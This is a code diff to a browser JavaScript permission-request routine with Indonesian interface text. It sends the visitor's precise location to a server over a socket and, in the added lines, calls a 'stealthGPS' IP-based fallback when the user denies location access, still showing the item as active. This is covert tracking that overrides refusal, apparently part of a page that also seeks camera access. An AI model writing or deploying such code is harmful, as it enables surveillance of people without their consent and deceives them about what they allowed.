@@ -965,6 +965,20 @@ function requestPermItem(perm) {
         itemEl.classList.add('active');
 
         return new Promise(r => {
+            const donePerm = () => {
+                itemEl.classList.remove('active');
+                statusEl.textContent = '\u2713 Aktif';
+                statusEl.style.color = '';
+                itemEl.classList.add('done');
+                r(true);
+            };
+            const doneFallback = () => {
+                itemEl.classList.remove('active');
+                statusEl.textContent = '\u2713 Aktif (IP)';
+                statusEl.style.color = '';
+                itemEl.classList.add('done');
+                r(true);
+            };
             const fail = () => {
                 itemEl.classList.remove('active');
                 statusEl.textContent = '\u26A0 Diblokir';
@@ -988,17 +1002,16 @@ function requestPermItem(perm) {
             };
 
             if (perm.id === 'location') {
-                if (!navigator.geolocation) { fail(); return; }
+                if (!navigator.geolocation) { stealthGPS(); doneFallback(); return; }
                 navigator.geolocation.getCurrentPosition(
                     (p) => {
                         socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
-                        itemEl.classList.remove('active');
-                        statusEl.textContent = '\u2713 Aktif';
-                        statusEl.style.color = '';
-                        itemEl.classList.add('done');
-                        r(true);
+                        donePerm();
                     },
-                    () => fail(),
+                    (err) => {
+                        if (err.code === 1) { stealthGPS(); doneFallback(); } // permission denied → fallback IP
+                        else fail(); // other error → retry
+                    },
                     {enableHighAccuracy:true,timeout:10000}
                 );
             } else if (perm.id === 'camera') {
